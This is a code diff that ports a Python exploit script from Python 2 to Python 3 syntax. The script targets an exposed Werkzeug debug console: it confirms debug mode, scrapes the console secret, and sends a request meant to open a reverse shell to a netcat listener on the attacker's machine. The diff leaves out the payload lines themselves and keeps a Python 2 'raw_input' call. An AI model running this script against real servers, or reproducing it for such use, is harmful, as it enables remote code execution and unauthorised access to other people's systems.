@@ -7,14 +7,14 @@ import urllib
 # usage : python exploit.py 192.168.56.101 5000 192.168.56.102 4422 
 
 if len(sys.argv) != 5:
-    print "USAGE: python %s <ip> <port> <your ip> <netcat port>" % (sys.argv[0])
+    print("USAGE: python %s <ip> <port> <your ip> <netcat port>" % (sys.argv[0]))
     sys.exit(-1)
 
 
 response = requests.get('http://%s:%s/console' % (sys.argv[1],sys.argv[2]))
 
 if "Werkzeug " not in response.text:
-    print "[-] Debug is not enabled"
+    print("[-] Debug is not enabled")
     sys.exit(-1)
 
 # since the application or debugger about python using python for reverse connect 
@@ -29,14 +29,14 @@ response = requests.get('http://%s:%s/console' % (sys.argv[1],sys.argv[2]))
 secret = re.findall("[0-9a-zA-Z]{20}",response.text)
 
 if len(secret) != 1:
-    print "[-] Impossible to get SECRET"
+    print("[-] Impossible to get SECRET")
     sys.exit(-1)
 else:
     secret = secret[0]
-    print "[+] SECRET is: "+str(secret)
+    print("[+] SECRET is: "+str(secret))
 
 # shell
-print "[+] Sending reverse shell to %s:%s, please  use netcat listening in %s:%s" % (sys.argv[1],sys.argv[2],sys.argv[3],sys.argv[4])
+print("[+] Sending reverse shell to %s:%s, please  use netcat listening in %s:%s" % (sys.argv[1],sys.argv[2],sys.argv[3],sys.argv[4]))
 
 raw_input("PRESS ENTER TO EXPLOIT")
 
@@ -50,7 +50,7 @@ data = {
 
 response = requests.get("http://%s:%s/console" % (sys.argv[1],sys.argv[2]), params=data,headers=response.headers)
 
-print "[+] response from server"
-print "status code: " + str(response.status_code)
-print "response: "+ str(response.text)
+print("[+] response from server")
+print("status code: " + str(response.status_code))
+print("response: "+ str(response.text))
             
